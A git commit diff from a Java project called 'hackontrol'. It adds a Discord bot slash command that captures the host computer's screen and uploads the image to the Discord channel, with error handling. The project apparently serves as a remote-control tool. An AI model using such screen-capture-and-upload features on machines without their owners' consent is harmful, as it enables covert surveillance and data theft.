c940d63659ffde5675301171b35bb0604deaef5b
KHOPAN <93379212+KHOPAN@users.noreply.github.com>
2024-01-24 23:32:08 +0700

    Implement Screenshot Command

--- src/com/khopan/hackontrol/command/popcorn/ScreenshotCommand.java
+++ src/com/khopan/hackontrol/command/popcorn/ScreenshotCommand.java
@@ -1,11 +1,12 @@
 package com.khopan.hackontrol.command.popcorn;
 
 import com.khopan.hackontrol.command.PopcornCommand;
+import com.khopan.hackontrol.function.Screenshot;
 
-import net.dv8tion.jda.api.entities.User;
 import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
 import net.dv8tion.jda.api.interactions.commands.build.Commands;
 import net.dv8tion.jda.api.interactions.commands.build.SlashCommandData;
+import net.dv8tion.jda.api.utils.FileUpload;
 
 public class ScreenshotCommand implements PopcornCommand {
 	@Override
@@ -16,8 +17,31 @@ public class ScreenshotCommand implements PopcornCommand {
 
 	@Override
 	public void handleCommand(SlashCommandInteractionEvent Event) {
-		User user = Event.getUser();
-		System.out.println(user.getGlobalName() + " used /screenshot");
-		Event.reply("Hello, world!\nThere is no screenshot!").queue();
+		byte[] screenshot = Screenshot.take();
+
+		if(screenshot == null || screenshot.length == 0) {
+			Event.reply("`Failed to take screenshot`").queue();
+			return;
+		}
+
+		if(screenshot.length != 1) {
+			Event.replyFiles(FileUpload.fromData(screenshot, "screenshot.png")).queue();
+			return;
+		}
+
+		byte exitCode = screenshot[0];
+
+		if(exitCode == 1 || exitCode == 4) {
+			Event.reply("`Error: Not enough memory`").queue();
+			return;
+		} else if(exitCode == 2) {
+			Event.reply("`Internal Error: GetDIBits() function error`").queue();
+			return;
+		} else if(exitCode == 3) {
+			Event.reply("`Error: PNG compression error`").queue();
+			return;
+		}
+
+		Event.reply("`Screenshot failed and exited with code: " + exitCode + "`").queue();
 	}
 }
